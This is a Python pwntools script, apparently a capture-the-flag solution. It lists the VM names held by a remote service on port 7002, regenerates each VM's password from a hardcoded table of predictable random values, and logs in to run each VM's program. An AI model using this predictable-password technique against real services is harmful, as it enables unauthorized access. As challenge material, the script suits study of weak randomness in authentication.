#!/usr/bin/env python2

import sys

from pwn import *


def generate_vm_password(vm_name):
    rands = [1427067673, 1902684766, 1510221571, 870974751, 1069112105, 1290152061, 915321812, 1820767556, 1556153964, 297300805, 708715349, 810737746, 367982810, 1748820345, 638898486, 36754606, 1844437741, 1497448660, 624421782, 1223075744, 1083279838, 921532472, 123008712, 1078666522, 650998284, 1243417060, 1005291151, 151680605, 1911479207, 1977646605, 1224416567, 1191063232]
    return ''.join(chr(ord('0') + (ord(char) + rands[i]) % 256 % 10) for i, char in enumerate(vm_name))


def execute_vm_program(io_factory, vm_name, vm_password):
    io = io_factory()

    try:
        io.sendlineafter('Exit\n', '2')
        io.sendlineafter('name:\n', vm_name)
        io.sendlineafter('password:\n', vm_password)
        io.sendlineafter('No\n', '1')

        log.info(io.recvline()[:-1])
        log.info(io.recvline()[:-1])
    finally:
        io.close()


def load_vm_names(io_factory):
    io = io_factory()

    try:
        io.sendlineafter('Exit\n', '3')
        vm_names = []
        while True:
            vm_name = io.recvline()[:-1]
            if 'Create VM' in vm_name:
                break
            vm_names.append(vm_name)
    finally:
        io.close()

    return vm_names


def main(io_factory):
    vm_names = load_vm_names(io_factory)
    for vm_name in vm_names:
        vm_password = generate_vm_password(vm_name)
        execute_vm_program(io_factory, vm_name, vm_password)


if __name__ == '__main__':
    io_factory = lambda: remote(sys.argv[1], 7002)
    main(io_factory)
